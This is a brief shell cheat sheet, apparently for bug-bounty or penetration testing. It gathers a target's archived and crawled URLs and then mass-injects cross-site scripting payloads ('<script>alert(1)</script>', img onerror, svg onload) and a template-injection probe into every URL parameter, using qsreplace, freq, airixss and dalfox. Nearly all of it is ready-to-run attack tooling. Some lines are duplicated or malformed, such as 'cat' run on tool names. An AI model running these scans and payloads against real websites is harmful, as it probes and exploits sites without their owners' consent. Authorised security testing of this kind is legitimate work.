...
cat waybackurls gau hakrawler katana findomain | uro | anew allurls;
...
cat allurls | grep -E '\.(js|json|txt)$' | anew js;

cat allurls | grep '=' | anew paramsallurls;
...
cat paramsallurls | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' | anew xss1;
cat paramsallurls | qsreplace '<script>alert(1)</script>'       | freq | egrep -v 'Not' | anew xss2;
cat paramsallurls | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' | anew xss3;
cat paramsallurls | qsreplace '{{7*7}}'                         | freq | egrep -v 'Not' | anew ssti2;
cat paramsallurls | qsreplace '"><svg onload=confirm(1)>'       | airixss -payload "confirm(1)" | egrep -v 'Not' | anew xss4;

cat allurls | html-tool comments | grep -oE '\b(https?|http)://[-A-Za-z0-9+&@#/%?=~_|!:,.;]*[-A-Za-z0-9+&@#/%=~_|]' | anew htmlComents;

cat paramsallurls | dalfox pipe | anew dalfox;
